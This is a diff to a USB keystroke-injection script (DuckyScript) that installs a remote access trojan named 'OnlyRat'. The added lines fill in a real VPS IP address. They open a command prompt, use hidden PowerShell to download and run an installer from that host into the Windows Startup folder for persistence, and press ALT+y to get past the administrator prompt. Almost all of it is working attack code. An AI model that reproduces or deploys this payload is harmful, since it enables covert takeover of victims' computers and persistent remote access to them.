@@ -32,13 +32,18 @@ EXTENSION DETECT_READY
 END_EXTENSION
 
 
-REM Your VPS IP address
-DEFINE #VPSaddress X.X.X.X
 
+REM Your VPS IP address
+DEFINE #VPSaddress 104.156.237.99
+
+REM run Command Prompt
 GUI r
-DELAY 200
-BACKSPACE
-DELAY 100
+DELAY 300
 STRINGLN cmd
 DELAY 500
-STRINGLN cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://#VPSaddress/mk01-onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && cd
+
+REM download and execute OnlyRat installer
+STRINGLN cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://#VPSaddress/mk01-onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && exit
+REM bypass admin question to continue installing with administrator privileges
+DELAY 1650
+ALT y
